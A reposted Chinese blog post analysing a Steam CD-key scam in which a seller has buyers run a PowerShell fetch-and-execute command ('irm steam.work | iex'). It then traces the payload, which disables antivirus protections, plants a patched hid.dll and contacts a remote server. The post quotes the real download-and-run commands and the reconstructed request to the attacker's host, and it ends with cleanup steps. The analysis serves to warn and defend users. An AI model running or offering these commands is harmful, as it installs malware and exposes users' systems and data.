---
layout: post
title: 一枝红信出墙来-steam假激活入库
fancybos: ture
abbrlink: 38498
date: 2024-07-31 14:49:18
tags:
---
## 免责声明

本文为转载文，不代表站长态度

本文一被原作者授权转载

## 正文

### 红信

很多玩家启动Steam后收到红信时都会感觉到一头雾水，实际上，红信是Steam官方对一些违反了用户协议的玩家所采取的一种警告手段，在玩家登录Steam客户端时就会查看到红信提示

1、Steam市场巡查机制，红锁

2、卖家举报，红锁

3、V社的肃清行动，红锁、

总之：steam使用会受到限制

### 清单入库

 结论放在前面：如果买 cdkey 买到让你要输入某个脚本再激活的，那别去管他，立刻退货并举报商家！原因就直接贴我写这个就行...

该商家在使用 Steam 注入病毒假入库来进行诈骗，证据：https://www.52pojie.cn/thread-1949495-1-1.html （本文的来源） 请立即退款，我将会向消费者协会说明本店情况！

该楼楼主打算买一个CDK送给他的朋友，结果一看发货介绍感觉有点不对劲：

```txt
[激活成功后不支持退款]
步骤1：按住键盘Win+X，找到powershell(终端管理员)(A)
步骤2：输入irm steam.work | iex (请复制，不要手打，输入后按回车键)
步骤3：启动STEAM，并在steam里左下角游戏卡密输入卡密，激活完成
```

`irm`和 `iex` 是经典的从网络获取脚本并执行的操作吗，怎么领个激活码还要搞这？

我一开始还以为是自动安装加速器，商家还怪好的捏，直到我激活不了（直接将激活码填入你steam的激活产品），就把这脚本拉下来看了看：

![伪装的steam-work脚本](https://pic.awaae001.top/%E7%BC%98%E7%BC%98%E5%A0%82/2024/01(steam-work)/%E4%BC%AA%E8%A3%85%E7%9A%84steam-work%E8%84%9A%E6%9C%AC_31299c97.webp)

好家伙 这玩意整了个极其有欺骗性的东西，因为powershell的多行注释正好是<# #>，正好 HTML 文件的开头是 `<!DOCTYPE html>` 这鸟人给他改成 `<#!DOCTYPE html>` 就变成 powershell 的注释了， 我都差点没看出来，网页还做了 UA 判断和跳转，真是够阴损

那么真实的代码就只剩两行了：

```shell
irm steam.work/pwsDwFile/new1 -OutFile x.ps1
powershell.exe -ExecutionPolicy Bypass -File x.ps1;
```
不出意料，又是下载脚本：

那就用shell脚本拉下来看看：

![145833we4z5wqcr1w4w51r](https://pic.awaae001.top/%E7%BC%98%E7%BC%98%E5%A0%82/2024/01(steam-work)/145833we4z5wqcr1w4w51r_fc657a00.jpg)



那么它干了什么呢？

- 如果当前正在运行流氓头子360，那么给他强制关闭（头子就是有牌面）
- 给Steam路径添加到Windows Defender的白名单里，方便接下来的操作，并且不论如何都输出<span>绿色<span>的成功（只能说是诡计多端）
- 替换你steam安装目录下的hid.dll文件（这是一个破解的动态连接库文件，用来在你输入卖家给的CDK之后显示成功并且骗过G胖让你下载游戏）
- 替换你C盘当前用户下的SteamActive中的hid.dll文件（和上一个差不多，但是这个里面有对当前用户的系统信息上传）

我怎么兑换个激活码你还给我注入上 Steam了！有病啊！
那么我们便不得不好奇一下注入的文件里到底干了啥呢，我们下下来拖进静态分析，但是里面几乎啥都没有，只有两个有意思的地方：

注意：

那俩个`pdf`文件下载下来就会被WD**秒杀**

这也许是要在前面加白名单的原因

1. 把危险函数 VirtualAlloc 等 伪装成普通函数：

![145838c3nhkbmqphhcbhb1](https://pic.awaae001.top/%E7%BC%98%E7%BC%98%E5%A0%82/2024/01(steam-work)/145838c3nhkbmqphhcbhb1_437ce830.jpg)

看上去他是在尝试现场解压某种payload来执行啊！我们直接开一个 Windows Sandbox 来动态调试一下：

打开 x32dbg，在 zlib.inflate处打断点，很容易就拿到解压出的东西

![](https://pic.awaae001.top/%E7%BC%98%E7%BC%98%E5%A0%82/2024/01%28steam-work%29/%E5%8F%8D%E6%9F%A5x32dbg.webp)

>[eax + 0x4 * 3] -> 解压出缓冲区指针
>
>[eax + 0x4 * 5] -> 解压出数据长度

不看不知道，一看 MZ 开头，PE格式没跑了，直接一个 savefile 把它存下来，拖进 `Binary Ninja`

这个文件也有点诡异，有三个 .text 段里面两个都是空的，还有一个 XRef 几乎扫不出来...总之先看一眼 IAT：

![](https://pic.awaae001.top/%E7%BC%98%E7%BC%98%E5%A0%82/2024/01%28steam-work%29/%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6.webp)

这里还有一些十足诡异的找不到引用的函数，看上去是加密的字符串

那么自然我们现在应该给导出的仅有的几个函数打一下断点看看；首当其冲怀疑的就是这个网络函数

直接先在该 dll 加载前打断点，暂停后在InternetOpenA打断点；发现有反调试检测，用 ScyllaHide Basic 轻松过掉

然后就断下来了

可以知道，病毒请求的是`api.steam.work/api/integral/vs`，但是一直访问发回的是`http-403`看来可能有什么 UA，POST body之类的，继续下断点查一下，最后在：`InternetOpenA InternetConnectA HttpOpenRequestA HttpSendRequestA`，成功复原整个请求

```
HTTP1.1 POST http://api.steam.work/api/integral/vs
Referer: version
user-agent: steam
{"sign":"ckv"}
```

返回值是一堆不知道什么的东西：目测是 hex

`075e4cb9b14878e57a3dbd35de8294ba`

直接拿它给的虚假激活码来激活，可以直接断在 HTTP 请求断点

![](
https://pic.awaae001.top/%E7%BC%98%E7%BC%98%E5%A0%82/2024/01%28steam-work%29/%E6%88%AA%E8%8E%B7%E8%AF%B7%E6%B1%82.webp)

看起来是成功了，返回一个 code 和一个 data；

这个 ID 又是啥？

我来搜索一下！

![1145350-steam](https://pic.awaae001.top/%E7%BC%98%E7%BC%98%E5%A0%82/2024/01%28steam-work%29/1145350-steam.webp)

哦，哈迪斯的 App ID

那么接着调试，在一通奇奇怪怪的网络请求之后，它下下来一个 8k 的文件到 steam 的目录里，这个文件不会导致steam有任何的变化，看来是病毒的文件。

文件头是：`SQLite format 3`，一个数据库文件。

![](https://pic.awaae001.top/%E7%BC%98%E7%BC%98%E5%A0%82/2024/01%28steam-work%29/%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93.webp)

有个appid，和两个不认识的hex；把键名拿去搜搜看：

![清单入库](https://pic.awaae001.top/%E7%BC%98%E7%BC%98%E5%A0%82/2024/01(steam-work)/%E6%B8%85%E5%8D%95%E5%85%A5%E5%BA%93_46e0afdf.webp)

原来是这样！这是一种叫做“清单入库”的已经广为流传的Steam免费入库方式，结果被不法商家用于欺诈消费者，十分恶劣！

## 如何解决？

- 买了，没激活

  - 那么如果你已经购买了，但是还没激活的，请立即找到店家进行退款，可以直接走第三方客服进行维权，运行不知名的指令，这是很危险的行为

- 买了，激活了

  - 如果你已经激活了，那么请先给steam关掉，避免被远在大陆另一侧的G胖发红色情书（如果关不掉可以使用Ctrl + Shift + ESC直接结束进程）

  - 然后卸载steam并且**重新安装**，并且找到你`C:\Users\用户名\AppData\Local\SteamActive`和`C:\Users\用户名\AppData\Local\Steam`手动删除，不然等于白卸

  - 然后查看你的`Windows Defender`**白名单**（打开你的powershell，这次也是管理员，执行 `Get-MpPreference | Select-Object -ExpandProperty ExclusionPath`，如果找到了和**steam相关**的东西，那么`Remove-MpPreference -ExclusionPath 你刚才查出的文件位置`）删除掉被强行加入杀毒软件白名单的**假动态链接库**文件

- 没买，看完原理心有不忿

  - 举报，干死他！

  - **破解有错，不告诉用户相关的风险，甚至不告诉用户这是破解，罪该万死！**

## 本文感谢

- https://www.bilibili.com/opus/912188403001327621
- https://www.52pojie.cn/thread-1949495-1-1.html

由`橘橘橘子汁`授权转载